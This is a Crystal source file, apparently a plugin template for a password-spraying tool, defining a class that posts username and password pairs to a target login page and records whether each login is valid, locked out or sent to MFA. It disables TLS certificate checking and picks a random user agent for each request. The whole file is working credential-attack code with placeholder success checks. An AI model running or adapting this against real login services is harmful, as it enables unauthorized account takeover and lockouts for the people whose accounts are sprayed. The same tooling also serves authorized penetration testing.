require "http/client"

class Template < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        } 

        form = "username=#{username}&password=#{password}" # request form params here
        
        # here is the basic request 
        page = client.post(url.path, headers: header, form: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # these are EXAMPLES of how to do checks 
        if page.status_code == 200 # if ok 
            valid = true 
        end

        if page.body.includes? "redircting to mfa"
            mfa = true 
        end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end